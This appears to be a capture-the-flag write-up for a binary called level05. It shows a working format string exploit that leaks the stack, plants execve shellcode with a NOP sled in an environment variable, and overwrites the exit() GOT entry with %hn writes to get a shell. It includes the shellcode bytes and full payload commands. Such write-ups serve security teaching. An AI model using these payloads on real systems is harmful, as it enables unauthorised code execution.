# level05
RELRO protection is disable. My presumption is that we will have to overwrite the __Global Offset Table (GOT)__

## Step 1: Understand the program
1. The program reads 100 bytes and store it in a buffer of 100 byteswith `fgets()`: __No segfault__
2. The program iterates over the buffer, and convert uppercase to lowercase: __Useless__
3. The program prints the raw buffer with an unprotected printf. __This is a format string vulnerablity__
4. finally, the program exits with `exit(0)`


## Goal

__Replace the `exit()` relocation address in the GOT to target a shellcode instead (thanks to the `%n` specifier)__


## Step 2: Leak the stack
Leak the stack to find somethings interesting

```bash
$ ./level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x
```
```console
aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 20782520 25207825
```

Yeah ! We have access to the buffer through the __10th__ specifer `%x`

## Step 3: Shellcode
### Export shellcode in env
```bash
export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
```

shellcode given [here](https://shell-storm.org/shellcode/files/shellcode-752.html) (21 bytes long)

### Locate shellcode in the memory

```bash
(gdb) x/20s *((char **)environ)
```
```console
0xffffd871:	 "SHELLCODE=\220\220[...]\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
```

shellcode is at `0xffffd871`. It begin by 100 NOOPs  

__`0xffffd871` = 4294957169__

## Step 4 : Find `exit()` in the GOT


Find the __GOT__ entry of `exit()`
```bash
readelf -r level05 | grep exit
```
```console
080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
```

The address of `exit()` is stored at `0x080497e0` in the __GOT__


## Exploit

1. Write the `exit()` entry point address in the buffer
2. Access to the buffer with the 10th specifier
3. Overwrite the content stored at the address specified in the buffer by the address of our shellcode using `%n` (`%n` take a pointer to int32).


```bash
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294957165d" + "%10$n"'; cat) | /home/users/level05/level05
```

4294957165 = 4294957169 - 4 --> (4 = characters already printed)

It doesn't work because `4294957165` is too much


### Necessary to optimize

We want to write `0xffffd871` at `0x080497e0`, That is to write 4 bytes at `0x080497e0`  

### Solution
We can write two bytes at a time:
- `0xd871` at `0x080497e0`
- `0xffff` at `0x080497e2`


```bash
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55401d" + "%10$hn" + "%10126d" + "%11$hn" '; cat) | /home/users/level05/level05
```
- 55401 = 0xd871 - 8 ----------> (8 = characters already printed)
- 10126 = 0xffff - 55401 - 8 --> (55401 + 8 = characters already printed)

`%hn` is used to write 2 bytes at a time


> `%hn`: 'h' means short int. So it specified a pointer on  `int16` (2 bytes) instead of a pointer on `int32`  
> It is also possible to jump in the middle of the NOOPs